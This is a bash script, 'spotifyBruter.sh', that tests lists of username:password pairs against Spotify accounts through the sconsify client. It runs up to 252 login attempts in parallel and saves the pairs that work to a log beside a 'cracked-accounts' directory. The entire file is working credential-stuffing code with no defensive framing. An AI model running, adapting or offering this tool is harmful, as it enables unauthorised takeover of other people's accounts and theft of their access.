#!/bin/bash

# - iNFO --------------------------------------
#
#  Authors: wuseman <wuseman@nr1.nu>
# FileName: spotifyBruter.sh
#  Created: 2023-06-17 20:17:12
# Modified: 2023-07-03 (08:56:25)
#  Version: 1.0
#  License: MIT
#
#      iRC: wuseman (Libera/EFnet/LinkNet)
#   GitHub: https://github.com/wuseman/
#
# ----------------------------------------------

root_requirements() {
    if [[ $EUID -ne 0 ]]; then
        echo "This script must be run as root."
        exit 1
    fi
}

display_help() {
    echo "Usage: $0 -w|--wordlist <wordlist> -p|--parallel <parallelism> [-l|--log <log>] [-h|--help] [-v|--version]"
    echo "Options:"
    echo "  -w, --wordlist   Specify the wordlist file (required)"
    echo "  -p, --parallel   Specify the number of parallel logins"
    echo "  -l, --log        Specify the log file name (default: date-sconsify.log)"
    echo "  -h, --help       Display this help information"
    echo "  -v, --version    Display the version of the script"
    exit 0
}

mkdir -p $HOME/cracked-accounts/sconsify/

display_version() {
    echo "sconsify.sh version 1.0"
    exit 0
}

wordlist=""
parallelism=""
log=""

if [ $# -lt 1 ]; then
    display_help
fi

while [[ $# -gt 0 ]]; do
    key="$1"
    case $key in
    -w | --wordlist)
        wordlist="$2"
        shift
        shift
        ;;
    -p | --parallel)
        parallelism="$2"
        shift
        shift
        ;;
    -l | --log)
        log="$2"
        shift
        shift
        ;;
    -h | --help)
        display_help
        ;;
    -v | --version)
        display_version
        ;;
    *)
        echo "Invalid argument: $1"
        echo "Usage: $0 -w|--wordlist <wordlist> -p|--parallel <parallelism> [-l|--log <log>] [-h|--help] [-v|--version]"
        exit 1
        ;;
    esac
done

if [ ! -f "$wordlist" ]; then
    echo "No wordlist found at path: $wordlist"
    exit 1
fi

if [ -z "$log" ]; then
    log_file="$HOME/sconsify/$(date +'%Y-%m-%d')-sconsify.log"
else
    log_file="$HOME/sconsify/$log"
fi

echo "----------------------------------------------" >>"$log_file"
echo "Script execution started: $(date +'%Y-%m-%d %H:%M:%S')" >>"$log_file"
echo "----------------------------------------------" >>"$log_file"

log_result() {
    local success=$1
    local username=$2
    local password=$3
    local duplicate=$4

    if [ -z "$duplicate" ]; then
        duplicate=""
    else
        duplicate="(duplicate: $duplicate)"
    fi

    if [ "$success" -eq 0 ]; then
        echo "$username:$password" >>"$log_file"
        echo "login"
    else
        echo "[<<] - Wrong login: $username:$password $duplicate" | tee -a "$log_file"
    fi
}

attempt_login() {
    local login_credentials=$1
    local username=$(echo "$login_credentials" | cut -d: -f1)
    local password=$(echo "$login_credentials" | cut -d: -f2)

    local result=$(echo "$password" | sconsify -username "$username" 2>&1)

    if [[ $result =~ "Error: Bad username and/or password" ]]; then
        log_result 1 "$username" "$password"
    else
        log_result 0 "$username" "$password"
    fi
}

export -f log_result
export -f attempt_login
export log_file

if [[ $parallelism -gt 252 ]]; then
    echo "Please use a parallelism value between 1 and 252."
    exit
elif [[ -z $parallelism ]]; then
    echo "You must specify a value for parallelism."
else
    cat "$wordlist" | parallel -j "$parallelism" --colsep ':' 'username={1}; password={2}; printf "%s" "$password" | sconsify -username "$username" | grep -i "needs a" > /dev/null && echo "$username:$password" >> "$log_file" && echo -e "[\e[1;32m>>\e[0m] - Login OK: $username:$password" || echo -e "[\e[1;31m>>\e[0m] - Wrong login: $username:$password"'
fi
